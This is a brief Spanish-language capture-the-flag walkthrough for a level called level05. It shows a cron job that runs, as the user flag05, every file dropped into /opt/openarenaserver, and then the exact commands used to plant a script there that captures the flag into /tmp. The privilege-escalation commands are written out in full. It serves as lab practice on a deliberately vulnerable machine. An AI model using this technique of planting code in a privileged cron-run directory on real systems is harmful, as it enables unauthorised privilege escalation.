- Cuando entro encuentro que he tengo un mail
- En /var/mail/ hay un archivo (level05)
- cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
- cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
	(ulimit -t 5; bash -x "$i")
	rm -f "$i"
done
- El script que se ejecuta cada 2 minutos lo que hace es ejecutar todos los archivos que hay en /opt/openarenaserver/ y luego los borra
- (ulimit -t 5) es un comando que limita la ejecución a 5 segundos
- creo en /opt/openarenaserver un exploit con lo siguiente:
- echo "/bin/getflg > /tmp/flag05" > /opt/openarenaserver/exploit
- luego chmod 777 /opt/openarenaserver/exploit
- para ver el resultado watch -n 0.1 cat /tmp/flag05

